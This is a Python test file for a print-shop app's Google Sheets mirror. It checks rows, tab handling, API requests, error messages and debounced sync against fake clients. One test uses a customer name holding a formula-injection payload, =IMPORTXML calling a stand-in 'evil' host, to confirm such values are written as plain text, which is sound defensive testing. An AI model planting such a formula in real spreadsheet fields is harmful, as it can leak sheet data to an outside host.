"""Google Sheet mirror, against a fake Google: rows, tab handling, the exact
API requests, errors, and the background mirror. No real spreadsheet."""
import json, os, pathlib, sys, tempfile, threading, time
from urllib.parse import unquote
ROOT = pathlib.Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

TMP = pathlib.Path(tempfile.mkdtemp(prefix="webuilt-sheets-"))
(TMP / "local").mkdir()
(TMP / "local" / "server.yaml").write_text(
    "enabled: true\npublic_url: 'https://quote.example.ts.net/'\n"
    "sheets:\n  enabled: true\n  spreadsheet_id: 'SHEET123'\n  tab: \"Orders (app)\"\n",
    encoding="utf-8")
os.environ["WEBUILT_DB"] = str(TMP / "orders.db")
os.environ["WEBUILT_LOCAL_DIR"] = str(TMP / "local")

from fastapi.testclient import TestClient
import app as appmod
import auth
import sheets

FX = ROOT / "tests" / "fixtures"
H = {"X-WeBuilt": "1"}
auth.create_user("boss", "boss-password-1", "admin")
auth.create_user("pim", "pim-password-1")
boss = TestClient(appmod.app)
boss.post("/api/login", json={"username": "boss", "password": "boss-password-1"}, headers=H)


class FakeSheets:
    def __init__(self):
        self.tabs, self.calls, self.fail = {}, [], None

    def _maybe_fail(self):
        if self.fail:
            raise sheets.SheetError(self.fail)

    def tab_titles(self):
        self._maybe_fail(); self.calls.append("titles"); return list(self.tabs)

    def add_tab(self, title):
        self.calls.append(f"add {title}"); self.tabs[title] = []

    def write(self, a1, rows):
        self.calls.append(f"write {a1}")
        tab = a1.split("'!")[0][1:].replace("''", "'")
        grid = self.tabs.setdefault(tab, [])
        while len(grid) < len(rows):
            grid.append([])
        for i, r in enumerate(rows):
            grid[i] = list(r) + grid[i][len(r):]

    def clear(self, a1):
        self.calls.append(f"clear {a1}")
        tab, cells = a1.split("'!")
        tab = tab[1:].replace("''", "'")
        grid = self.tabs.get(tab, [])
        start = cells.split(":")[0]
        if start[0] == "A":                    # rows from N down
            del grid[int(start[1:]) - 1:]
        else:                                  # columns from a letter rightwards
            col = ord(start[0]) - ord("A")
            for row in grid:
                del row[col:]


def make_order(**extra):
    r = boss.post("/api/quote", headers=H, data={"client_profile": "engineering", **extra},
                  files=[("files", ("j.gcode", (FX / "orca_tiny_pla.gcode").read_bytes()))])
    assert r.status_code == 200, r.text
    return r.json()


def test_rows_match_the_team_sheet():
    d = make_order(customer_name="K'Somchai", delivery="university")
    boss.patch(f"/api/orders/{d['quote_id']}", headers=H, json={"status": "printing", "handled_by": "pim"})
    boss.post(f"/api/orders/{d['quote_id']}/payment", headers=H, data={"status": "paid", "method": "Cash"})
    rows = sheets.sheet_rows()
    assert rows[0] == sheets.HEADER
    row = next(r for r in rows if r[0] == d["receipt_no"])
    assert row[1].count("/") == 2 and len(row[1]) == 10            # 23/10/2026
    assert row[2] == "K'Somchai" and row[3] == "PLA" and row[4] == "Normal"
    assert row[5] == d["total"] and isinstance(row[5], float)       # a number, so it sums
    assert row[6] == "จ่ายแล้ว" and row[7] == "กำลังปริ้น" and row[8] == "ส่งให้ที่มหาลัย"
    assert row[10] == "boss" and row[11] == "pim"
    assert row[12] == f"https://quote.example.ts.net/orders/{d['quote_id']}"
    print(f"  rows            {row[:9]}")


def test_sync_creates_tab_and_overwrites_edits():
    fake = FakeSheets()
    fake.tabs["Old queue"] = [["WB-2610-001", "hand-kept"]]
    n = sheets.sync_once(fake, "Orders (app)")
    assert "add Orders (app)" in fake.calls and fake.tabs["Old queue"] == [["WB-2610-001", "hand-kept"]]
    grid = fake.tabs["Orders (app)"]
    assert len(grid) == n + 1 and grid[0] == sheets.HEADER
    grid[1][2] = "EDITED IN SHEET"
    grid.append(["junk row"])
    grid[1].append("junk column")
    sheets.sync_once(fake, "Orders (app)")
    grid = fake.tabs["Orders (app)"]
    assert grid[1][2] != "EDITED IN SHEET" and ["junk row"] not in grid
    assert all(len(r) == len(sheets.HEADER) for r in grid)
    assert fake.calls.count("add Orders (app)") == 1
    print(f"  sync            tab created once, {n} orders written, sheet edits + extra rows/columns "
          "undone, other tabs untouched")


def test_formula_looking_names_stay_text():
    make_order(customer_name='=IMPORTXML("http://evil","//a")')
    fake = FakeSheets()
    sheets.sync_once(fake, "Orders (app)")
    assert any(r[2] == '=IMPORTXML("http://evil","//a")' for r in fake.tabs["Orders (app)"])
    print("  formulas        customer name '=IMPORTXML(...)' passed through as text (sent RAW)")


class FakeResponse:
    def __init__(self, code, body=None):
        self.status_code, self._body = code, body or {}
        self.content = json.dumps(self._body).encode()
        self.text = self.content.decode()

    def json(self):
        return self._body


class FakeSession:
    def __init__(self, code=200):
        self.code, self.sent = code, []

    def request(self, method, url, **kw):
        self.sent.append((method, url, kw))
        if self.code != 200:
            return FakeResponse(self.code, {"error": {"message": "nope"}})
        if method == "GET":
            return FakeResponse(200, {"sheets": [{"properties": {"title": "Sheet1"}}]})
        return FakeResponse(200, {})


def test_google_requests_are_exactly_right():
    s = FakeSession()
    client = sheets.GoogleSheetsClient("SHEET123", pathlib.Path("unused"), session=s)
    sheets.sync_once(client, "Bob's (app)")
    methods = [(m, unquote(u.split("/spreadsheets/")[1])) for m, u, _ in s.sent]
    assert methods[0] == ("GET", "SHEET123")
    assert methods[1] == ("POST", "SHEET123:batchUpdate")
    assert s.sent[1][2]["json"]["requests"][0]["addSheet"]["properties"]["title"] == "Bob's (app)"
    put = next(x for x in s.sent if x[0] == "PUT")
    assert put[2]["params"] == {"valueInputOption": "RAW"}
    assert unquote(put[1]).endswith("/values/'Bob''s (app)'!A1")
    assert " " not in put[1] and "'" not in put[1].split("/values/")[1]    # encoded in the URL
    assert put[2]["json"]["values"][0] == sheets.HEADER
    clears = [unquote(u) for m, u, _ in s.sent if u.endswith(":clear")]
    assert len(clears) == 2 and all("'Bob''s (app)'!" in u for u in clears)
    print("  requests        GET meta, addSheet, PUT …?valueInputOption=RAW with encoded "
          "'Bob''s (app)'!A1, then 2 clears")


def test_errors_tell_the_admin_what_to_do():
    for code, phrase in ((403, "Share the spreadsheet"), (404, "spreadsheet_id"), (500, "Google answered 500")):
        client = sheets.GoogleSheetsClient("X", pathlib.Path("unused"), session=FakeSession(code))
        client.email = "webuilt@proj.iam.gserviceaccount.com"
        try:
            sheets.sync_once(client, "T")
        except sheets.SheetError as e:
            assert phrase in str(e), e
            if code == 403:
                assert "webuilt@proj.iam.gserviceaccount.com" in str(e)
        else:
            raise AssertionError(code)
    try:
        sheets.GoogleSheetsClient("X", TMP / "missing.json")
    except sheets.SheetError as e:
        assert "key is missing" in str(e)
    print("  errors          403 -> share with <service account>; 404 -> check id; missing key file named")


def test_mirror_status_retry_and_admin_button():
    fake = FakeSheets()
    m = sheets.SheetMirror(client_factory=lambda: fake)
    fake.fail = "Google refused access. Share the spreadsheet…"
    st = m.sync_now()
    assert st["error"].startswith("Google refused") and st["error_at"]
    fake.fail = None
    st = m.sync_now()
    assert st["error"] is None and st["rows"] >= 1 and st["last_ok"]
    sheets.mirror.client_factory = lambda: fake
    r = boss.post("/api/admin/sheet/sync", headers=H).json()
    assert r["error"] is None and r["rows"] == st["rows"]
    s = boss.get("/api/admin/status").json()["sheet"]
    assert s["enabled"] and s["last_ok"] and s["rows"] == st["rows"]
    print(f"  mirror          error recorded then cleared on success; admin Sync now wrote {r['rows']} rows")


def test_bursts_become_one_write():
    fake = FakeSheets()
    m = sheets.SheetMirror(client_factory=lambda: fake)
    m.DEBOUNCE = 0.3
    m.start()
    time.sleep(1.0)                                 # the start-up sync
    first = fake.calls.count("titles")
    for _ in range(20):
        m.mark_dirty()
        time.sleep(0.01)
    time.sleep(1.0)
    m.stop()
    syncs = fake.calls.count("titles") - first
    assert first == 1 and syncs == 1, (first, syncs)
    print(f"  coalescing      20 changes in 0.2 s -> {syncs} write")


def test_changes_wake_the_mirror():
    seen = []
    import orders
    orders.on_change(lambda: seen.append(1))
    before = sheets.mirror.dirty.is_set()
    sheets.mirror.dirty.clear()
    make_order()
    assert sheets.mirror.dirty.is_set() and seen
    print("  wake            saving a quote marks the sheet as out of date")


def test_email_shown_before_first_successful_sync():
    """The admin needs the address to share the sheet with BEFORE a sync can work."""
    class Refused(FakeSheets):
        email = "webuilt@proj.iam.gserviceaccount.com"
        def tab_titles(self):
            raise sheets.SheetError("Google refused access.")
    sheets.set_state("sheet", {})
    st = sheets.SheetMirror(client_factory=Refused).sync_now()
    assert st["error"] and st["service_account"] == "webuilt@proj.iam.gserviceaccount.com"
    print("  first setup     refused sync still records the service-account email to share with")


if __name__ == "__main__":
    fns = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    print(f"\nRunning {len(fns)} sheet tests\n")
    failed = 0
    for fn in fns:
        try:
            fn()
        except Exception as e:
            failed += 1
            import traceback; traceback.print_exc()
            print(f"  FAIL {fn.__name__}: {e!r}")
    print(f"\n{len(fns)-failed}/{len(fns)} passed\n")
    sys.exit(1 if failed else 0)
